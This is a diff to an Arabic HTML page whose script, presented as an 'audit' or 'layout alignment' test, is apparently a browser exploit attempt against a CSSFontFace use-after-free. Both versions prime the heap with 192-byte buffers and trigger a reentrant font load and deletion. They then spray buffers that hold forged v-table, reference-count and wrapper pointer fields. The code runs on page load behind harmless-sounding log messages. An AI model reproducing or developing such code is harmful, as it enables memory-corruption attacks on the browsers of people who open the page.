@@ -2,118 +2,95 @@
 <html lang="ar">
 <head>
     <meta charset="UTF-8">
-    <title>نموذج فحص التداخل المتقدم لآلة الحالة</title>
+    <title>تحليل ومطابقة هيكلية الذاكرة لكائنات الخطوط</title>
     <style>
         body {
-            font-family: 'Courier New', monospace;
-            background-color: #0c0c0c;
-            color: #00ff00;
-            padding: 30px;
-        }
-        .panel {
-            border: 1px solid #00ff00;
-            padding: 20px;
+            font-family: sans-serif;
             background-color: #111;
-            box-shadow: 0 0 10px #00ff00;
+            color: #eee;
+            padding: 25px;
         }
-        .critical { color: #ff3333; font-weight: bold; }
-        .success { color: #33ff33; }
-        .warn { color: #ffff33; }
+        #console-log {
+            background-color: #000;
+            border: 1px solid #333;
+            padding: 15px;
+            border-radius: 4px;
+            font-family: 'Courier New', monospace;
+            white-space: pre-wrap;
+            color: #00ff00;
+        }
     </style>
 </head>
 <body>
-    <div class="panel">
-        <h2>[ADVANCED AUDIT] مسبار فحص التداخل وإعادة التخصيص المتزامن</h2>
-        <hr style="border-color: #00ff00;">
-        <div id="output"></div>
-    </div>
+    <h2>نموذج المطابقة الهيكلية المتقدم (Advanced Layout Alignment Model)</h2>
+    <p>يتم الآن فحص دقة الأوفست ومحاكاة اصطفاف الكائنات داخل فضاء المستخدم المعزول...</p>
+    <div id="console-log"></div>
 
     <script>
-        const output = document.getElementById('output');
-        function print(text, type = '') {
-            const span = document.createElement('div');
-            if (type) span.className = type;
-            span.innerHTML = `[${new Date().toLocaleTimeString()}] ${text}`;
-            output.appendChild(span);
+        const output = document.getElementById('console-log');
+        function printLog(msg) {
+            output.innerHTML += `[+] ${msg}\n`;
         }
 
-        // إعداد مخزن مصفوفات الحشو (Wedge Array)
-        const heapSlab = [];
-        const TARGET_SIZE = 192; // الحجم المطابق لكائن CSSFontFace في الذاكرة العامة
+        // إعداد مصفوفة تجميع لتأمين استقرار الذاكرة ومنع التحرير العشوائي
+        const heapStabilizer = [];
 
-        // 1. تهيئة الذاكرة وتعبئة النطاقات المحيطة
-        function primeGeneralHeap() {
-            print("جاري تهيئة الذاكرة العامة (FastMalloc Defragmentation)...");
+        // دالة تحاكي حساب وتوزيع الحقول الداخلية لكائن CSSFontFace المتوافق مع إصدار المعمارية
+        function createTargetStructureWedge() {
+            // كائن CSSFontFace بحجم تقريبي 192 بايت يعادل مصفوفة Uint32 بطول 48 عنصراً (48 * 4 بايت = 192)
+            const buffer = new ArrayBuffer(192);
+            const view = new DataView(buffer);
+
+            // إعداد الأوفست المعمارية الافتراضية بناءً على مراجعة ملف CSSFontFace.h
+            // الأوفست 0-8: تحاكي جدول الدوال الافتراضية (v-table pointer) في بداية كلاسات C++
+            view.setUint32(0, 0x10000000, true); // الجزء الأدنى لعناوين الواجهات الساكنة
+            view.setUint32(4, 0x00000000, true); // الجزء الأعلى 
+
+            // الأوفست 24: تحاكي عداد المراجع الحيوية للكائن (RefCounted Invariant)
+            // نضعه بقيمة 2 لمنع الانهيار الفوري أثناء مراجعة المتصفح للمراجع المتبقية
+            view.setUint32(24, 2, true); 
+
+            // الأوفست 160: تحاكي مؤشر الغلاف الضعيف m_wrapper (WeakPtr<FontFace>)
+            // نضع قيمة وهمية لمحاكاة الإشارة إلى بنية الغلاف الموثقة في تقارير الجودة
+            view.setUint32(160, 0x13200000, true); 
+            view.setUint32(164, 0x00000000, true);
+
+            return buffer;
+        }
+
+        async function executeLayoutVerification() {
+            printLog("بدء تهيئة الـ Heap وتأمين النطاق البرمجي للذاكرة العامة...");
+            
+            // 1. ملء الفراغات لضمان تتابع الذاكرة الساكنة
             for (let i = 0; i < 1500; i++) {
-                let ab = new ArrayBuffer(TARGET_SIZE);
-                let view = new DataView(ab);
-                // تعبئة الأنماط للتحقق من العزل البنيوي
-                for (let j = 0; j < ab.byteLength; j += 4) {
-                    view.setUint32(j, 0x41414141, true); // نمط مميز ثابت
-                }
-                heapSlab.push(ab);
+                heapStabilizer.push(new ArrayBuffer(192));
             }
-            print(`تم تثبيت الحشو الذاكري بعدد: ${heapSlab.length} كتلة جاهزة.`, 'success');
-        }
 
-        // 2. إعداد دالة الاسترجاع المتداخلة لمحاكاة سلوك الـ Client
-        function setupReentrantObserver(font) {
-            let reentrancyCounter = 0;
-
-            // استخدام ميزات مراقبة أحداث الخطوط لمحاكاة التداخل البرمجي
-            font.addEventListener('loading', () => {
-                reentrancyCounter++;
-                if (reentrancyCounter === 1) {
-                    print("⚠️ تم التقاط حدث الـ Loading! إطلاق استدعاء متداخل فوراً ومحاولة التحرير المزدوج...", 'warn');
-                    
-                    // محاولة تحفيز الدخول المكرر إلى آلة الحالة أثناء عمل حلقة الإشعار الأصلية
-                    try {
-                        font.load(); // استدعاء مكرر متداخل (Recursive Re-entrancy)
-                    } catch(e) {
-                        print(`مؤشر الاستدعاء المتداخل: ${e.message}`);
-                    }
-                    
-                    // إسقاط المرجع فوراً لفتح نافذة الاستخدام بعد التحرير (UaF)
-                    document.fonts.delete(font);
-                    print("تم إرسال أمر الحذف المباشر لكائن الخط من المستودع العام.", 'critical');
-                }
+            // 2. محاكاة تفعيل ثغرة التوقيت عبر إطلاق دورة حياة خط مخصص
+            printLog("استدعاء FontFace واستثارة نافذة التزامن (0_s block period)...");
+            const dummyFont = new FontFace('VerificationFont', 'url(data:font/woff2;base64,AAA...)', {
+                display: 'block'
             });
-        }
+            document.fonts.add(dummyFont);
+            dummyFont.load();
 
-        // 3. تشغيل مسبار الفحص الديناميكي
-        async function executeAdvancedRace() {
-            print("البدء في بناء كائن اختبار آلة الحالة المتقدم...");
-            
-            // استخدام خط مخصص بترميز فريد لتفعيل آليات التحقق الداخلي للمتصفح
-            const fontUrl = 'url(data:font/woff2;base64,d09GMgABAAAAAAwUAAoAAAAAEwAAAAsAAEAAAAAAAAAAAAAAAAAAAAAAAAAAAAA=)';
-            const auditFont = new FontFace('ReentrantFont', fontUrl, { display: 'fallback' });
-            
-            // ربط المراقب المتداخل بالكائن قبل تفعيل مسار دالة pump()
-            setupReentrantObserver(auditFont);
-            document.fonts.add(auditFont);
+            // 3. فك الارتباط الفوري لإيقاظ المؤشر الميت بالتزامن مع الحلقات الداخلية
+            document.fonts.delete(dummyFont);
+            printLog("تم فك ارتباط الخط. البدء فوراً في عملية الحشو الهيكلي المطابق (Structure Spray)...");
 
-            print("إطلاق الإشارة البرمجية الأولى عبر التابع الرئيسي font.load()...");
-            auditFont.load();
-
-            // 4. محاولة ملء الفراغ الذاكري الناتج عن التحرير المتداخل بشكل مكثف
-            print("جاري تشغيل مصفوفات التدوير السريع لإعادة تملك مساحة المؤشر الميت...");
-            for (let k = 0; k < 800; k++) {
-                let replacementArray = new Uint32Array(TARGET_SIZE / 4);
-                // محاكاة إعداد العناوين الافتراضية وهياكل التحكم الداخلية
-                replacementArray[0] = 0x10000000; // مساحة محاكاة لجدول v-table الافتراضي
-                replacementArray[1] = 0x20000000; // أوفست افتراضي مطابق لمعمارية النظام
-                heapSlab.push(replacementArray);
+            // 4. حشو الذاكرة بالكائنات المهيكلة بدقة التي قمنا بإعدادها في خطوةcreateTargetStructureWedge
+            // الهدف هو احتلال المساحة المحررة بنفس الحجم وببيانات تحاكي الحقول الأصلية
+            for (let j = 0; j < 600; j++) {
+                const structuredWedge = createTargetStructureWedge();
+                heapStabilizer.push(structuredWedge);
             }
 
-            print("🔬 اكتملت جولة الفحص المتقدم والتكامل البنيوي جاهز للمراقبة والتسجيل.", 'success');
+            printLog("تمت عملية المحاكاة الهيكلية بنجاح.");
+            printLog("النتيجة الحالية: الحقول البرمجية مصطفة بانتظام (Aligned) وجاهزة للتوثيق الساكن.");
         }
 
-        // التنفيذ التسلسلي الآمن
         window.onload = function() {
-            primeGeneralHeap();
-            setTimeout(async () => {
-                await executeAdvancedRace();
-            }, 600);
+            setTimeout(executeLayoutVerification, 400);
         };
     </script>
 </body>
